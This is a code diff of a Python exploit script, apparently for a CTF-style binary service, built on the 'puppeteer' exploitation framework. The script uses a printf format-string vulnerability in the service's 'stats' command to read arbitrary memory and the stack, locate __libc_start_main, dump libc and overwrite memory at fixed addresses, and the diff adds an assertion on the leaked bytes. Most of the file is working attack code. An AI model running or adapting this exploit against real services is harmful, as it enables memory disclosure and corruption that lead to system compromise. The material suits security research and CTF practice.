@@ -1,14 +1,17 @@
-import puppeteer
+import puppeteer as p
 
 import logging
-import standard_logging
+try:
+    import standard_logging # pylint: disable=W0611
+except ImportError:
+    pass
 logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
 logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
 logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)
 
-class Aggravator(puppeteer.Manipulator):
+class Aggravator(p.Manipulator):
     def __init__(self, host, port):
-        puppeteer.Manipulator.__init__(self, puppeteer.x86)
+        p.Manipulator.__init__(self, p.x86)
 
         # some initial info from IDA
         # TODO: maybe use IDALink to get this automatically?
@@ -16,10 +19,10 @@ class Aggravator(puppeteer.Manipulator):
         self.locations['#main_end'] = 0x0804A9D1
         self.info['main_stackframe_size'] = 0x24
 
-        self.c = puppeteer.Connection(host=host, port=port)
+        self.c = p.Connection(host=host, port=port)
         self.c.read_until("> ")
 
-    @puppeteer.printf_flags(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
+    @p.printf_flags(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
     def stats_printf(self, fmt):
         self.c.send("stats " + fmt + "\n")
         self.c.read_until("kill top:\n")
@@ -40,9 +43,10 @@ def main():
     # And now, we can to stuff!
 
     # We can read the stack!
-    #print "STACKZ",a.read_stack(1000).encode('hex')
+    #print "STACKZ",a.dump_stack(1000).encode('hex')
 
-    #print "LOOK WHAT WE CAN READ!!", a.do_memory_read(0x0804AAAA, 20)
+    print "Testing memory read."
+    assert a.do_memory_read(0x0804A9C3, 16) == '\x00\x8B\x44\x24\x1C\x89\x04\x24\xE8\x20\xFE\xFF\xFF\xC9\xC3\x66'
 
     ## We can figure out where __libc_start_main is!
     lcsm = a.main_return_address(start_offset=390)
@@ -51,7 +55,7 @@ def main():
     # now dump it!
     #libc = a.dump_elf(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
     #print "dumped %d pages from libc" % len(libc)
-    a.dump_libc("aggregator_libc", start_offset=390)
+    #a.dump_libc("aggregator_libc", start_offset=390)
 
     # We can overwrite memory with ease!
     a.do_memory_write(0x0804C344, "OK")
